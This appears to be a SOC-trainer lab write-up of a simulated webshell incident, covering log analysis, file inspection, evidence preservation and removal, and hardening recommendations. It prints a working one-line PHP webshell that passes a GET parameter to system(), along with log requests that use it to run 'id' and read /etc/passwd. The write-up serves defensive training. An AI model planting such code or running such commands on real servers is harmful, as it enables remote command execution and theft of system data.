# ALERT-1006 — Webshell on a Web Server (T1505.003)

> **Training environment:** Work Trainer / local SOC Analyst Trainer (simulated evidence)  
> **Lab severity:** High | **Lab result:** 6 of 6 checklist items completed  
> **Completed:** October 2026  
> **Technique:** [MITRE ATT&CK T1505.003 — Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)  
> **Note:** This is an educational reconstruction, not a real customer incident.

## Objective

Investigate unusual requests to a web server's `/uploads` directory, inspect a potentially malicious PHP file, preserve evidence before removing the file from the served directory, and document the outcome.

## Evidence and timeline

The simulated Nginx access log contained the following records (dates and timezone were not provided):

```text
192.0.2.88 [09:10:01] "POST /upload.php" 200 file=img.php
192.0.2.88 [09:10:15] "GET /uploads/img.php?c=id" 200
192.0.2.88 [09:10:40] "GET /uploads/img.php?c=cat+/etc/passwd" 200
198.51.100.5 [09:11:02] "GET /index.php" 200
```

The addresses `192.0.2.88` and `198.51.100.5` belong to documentation ranges and are **simulated indicators only**, not production IPs to block.

### What the records indicate

1. `192.0.2.88` uploaded a file named `img.php` through `/upload.php`.
2. The same source requested the uploaded PHP file twice, supplying the query parameter `c` with command-like values: `id` and `cat /etc/passwd`.
3. The unrelated `GET /index.php` from `198.51.100.5` is not part of the observed suspicious sequence.
4. HTTP status `200` shows a successful HTTP response, **not verified successful command execution**.

## File inspection

The analyst examined `/var/www/html/uploads/img.php`. The simulated file contained:

```php
<?php system($_GET['c']); ?>
```

This accepts a user-controlled GET parameter and passes it to PHP's `system()` function. It is a **webshell implementation** capable of executing operating-system commands in the web server's process context.

The access log and inspected file are mutually reinforcing evidence that the endpoint was **requested with command parameters**. However, the lab did not provide the HTTP response bodies, process telemetry, or other artifacts necessary to independently verify the output or success of those commands.

**Finding:** True Positive — webshell file present, with suspicious external requests.  
**Not established:** successful command execution for each request, credential theft, data exfiltration, or broader host compromise.

## Investigation and containment actions

| Step | Analyst command / action | Observed result and limitation |
|---|---|---|
| Inspect requests | `cat /var/log/nginx/access.log` | Source, sequence and requested URL parameters identified. |
| Inspect file | `cat /var/www/html/uploads/img.php` | Dangerous `system($_GET['c'])` PHP code observed. |
| Compute hash | `sha256sum /var/www/html/uploads/img.php` | Simulator returned `5d41402a...`, **an abbreviated placeholder**, not a usable 64-character SHA-256 digest. |
| Preserve evidence | `cp /var/www/html/uploads/img.php ~/evidence/` | `ls -la ~/evidence/` subsequently listed `img.php` (29 bytes). Content equality was not independently hash-verified. |
| Remove webshell | `rm /var/www/html/uploads/img.php` | The simulator's removal checklist item was completed. The analyst did not supply a separate post-removal `ls` result. |
| Document incident | Incident ticket identifying True Positive, webshell and source `192.0.2.88` | Simulator accepted the ticket criteria. |

### Evidence-integrity caveat

A defensible production workflow should record the **complete** SHA-256 digest, compare the original with the acquired copy, store acquisition time and access controls, and retain chain-of-custody information. The training simulator's truncated hash response **does not support a cryptographic integrity claim**.

## Recommended next steps in a production environment

The following are recommendations, **not actions shown as completed in this lab**:

- Identify how an executable PHP file was accepted into the uploads directory.
- Disable script execution within upload locations; validate file types and storage destinations.
- Review web server and host process logs for command execution, outbound connections and other unexpected files.
- Inspect the affected application, deployment permissions, and the web-server service account.
- Search for additional related requests across access logs, WAF telemetry, and endpoint detection.
- Apply the organization's containment, evidence preservation and recovery procedures.

## Lessons learned

- A file extension or HTTP `200` status alone is not proof of malicious behavior or successful exploitation.
- Combining access-log requests with server-side file inspection produces stronger evidence.
- Preserve artifacts **before** removing a suspected malicious file.
- A completed simulator checklist is **not equivalent** to independent verification of all real-world security controls.

## References

- [MITRE ATT&CK T1505.003 — Web Shell](https://attack.mitre.org/techniques/T1505/003/)
- [PHP manual — system()](https://www.php.net/manual/en/function.system.php)
- [GNU Coreutils — sha2 utilities / checksum verification](https://www.gnu.org/software/coreutils/manual/html_node/sha2-utilities.html)
